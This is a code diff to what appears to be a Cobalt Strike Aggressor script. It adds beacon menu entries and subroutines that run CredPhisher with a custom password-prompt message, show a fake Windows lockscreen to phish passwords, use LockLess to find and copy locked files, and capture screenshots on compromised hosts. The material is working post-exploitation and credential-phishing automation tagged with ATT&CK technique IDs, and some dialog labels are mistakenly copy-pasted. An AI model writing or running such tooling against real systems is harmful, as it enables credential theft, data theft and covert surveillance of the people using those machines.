@@ -405,6 +405,36 @@ item "Find File Servers  - T1083"{
 			getnetfileserver($bid);
 		}
 	}
+	
+menu "LockLess"{
+item "Find All Locked Files And Process Handles - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklessall($bid);
+      }
+   }
+
+item "Find Process Handles For Specific File - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklessfindproc($bid);
+      }
+   }   
+   
+item "Copy Locked File By Filename - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklesscopy($bid);
+      }
+   }   
+
+item "Copy Locked File By Filename and Process ID - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklesscopypid($bid);
+      }
+   }      
+}	
 }
 
 
@@ -459,24 +489,44 @@ menu "Phishing Users"
 {
 #Run CredPhisher
 					
-		item "Prompt for Username and Password  - T1141"{
+	item "Prompt for Username and Password  - T1141"{
+		local('$bid');
+			foreach $bid ($1){
+				credphisher($bid);
+			}
+		}
+		
+#Run Custom CredPhisher	
+	item "Prompt Custom Message  - T1141"{
 			local('$bid');
 				foreach $bid ($1){
-					credphisher($bid);
+					custcredphisher($bid);
 				}
 			}
-		
 			
 #Run Lock Screen Phishing Exploit
 					
-		item "Show Lockscreen to Phish Password  - T1141"{
-			local('$bid');
-				foreach $bid ($1){
-					lockscreen($bid);
-				}
+	item "Show Lockscreen to Phish Password  - T1141"{
+		local('$bid');
+			foreach $bid ($1){
+				lockscreen($bid);
 			}
+		}
 		
 }
+
+#################################################
+
+#   Screenshots
+
+#################################################
+item "Screenshots"{
+	local('$bid');
+		foreach $bid ($1){
+			screenshots($bid);
+		}
+	}
+
 
 #################################################
 
@@ -916,6 +966,69 @@ sub getnetfileserver{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetFileServer");
 }
 
+
+#################################################
+#   LockLess - SubMenu
+#################################################
+
+#Find All Locked Files And Process Handles 
+sub locklessall{
+bexecute_assembly($1, script_resource('/exe/LockLess.exe'), "all");
+}
+   
+sub locklessfindproc{
+ $bid = $1;
+    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(file => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['file']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Handle....');
+            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Find Which Process Has Handle On File");
+    drow_text($dialog, "file",  "Please Enter A FileName:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
+
+sub locklesscopy{
+ $bid = $1;
+    $dialog = dialog("LockLess: Copy Locked File By FileName", %(file => "", dest => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['file'] /copy:$3['dest']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Copying File....');
+            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Copy Locked File By FileName");
+    drow_text($dialog, "file",  "Please Enter A FileName:");
+    drow_text($dialog, "dest",  "Please Enter The Destination To Copy The File:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}    
+   
+sub locklesscopypid{
+ $bid = $1;
+    $dialog = dialog("LockLess: Copy Locked File By FileName And Process ID", %(file => "", proc => "", dest => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['file'] /process:$3['proc'] /copy:$3['dest']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Copying File....');
+            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
+    drow_text($dialog, "file",  "Please Enter A FileName:");
+    drow_text($dialog, "proc",  "Please Enter A Process ID:");
+    drow_text($dialog, "dest",  "Please Enter The Destination To Copy The File:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
 #################################################
 
 #   Mimikatz: Token Enumeration
@@ -949,12 +1062,55 @@ bmimikatz($1, "token::list /enterpriseadmin");
 
 # Phish Users with small pop up box
 sub credphisher{
-bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Your Password"');
+}
+
+# Phish Users with custom pop up box
+sub custcredphisher{
+ $bid = $1;
+    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(popu => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "\"$3['popu']\"";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Handle....');
+            bexecute_assembly($bid, script_resource('exe/CredPhisher.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Custom Cred Phisher Prompt");
+    drow_text($dialog, "popu",  "Please Enter A Custom Pop Up Message:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
 }
 
 # Phish Users with fake lockscreen
 sub lockscreen{
 bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
+}
+
+#################################################
+
+#   Screenshot
+
+#################################################
+
+sub screenshots{
+ $bid = $1;
+    $dialog = dialog("Screenshots", %(pid => "", arc => "", time => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['pid'] $3['arc'] $3['time']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Taking Screenshots....');
+            bscreenshot($bid, $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Take Screenshots");
+    drow_text($dialog, "pid",  "Please Enter A Process ID:");
+    drow_combobox($dialog, "arc",  "Please Select The Proper Architecture:", @("x64", "x86"));
+    drow_text($dialog, "time",  "How Many Seconds Would You Like To Take Screenshots?:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
 }
 
 #################################################
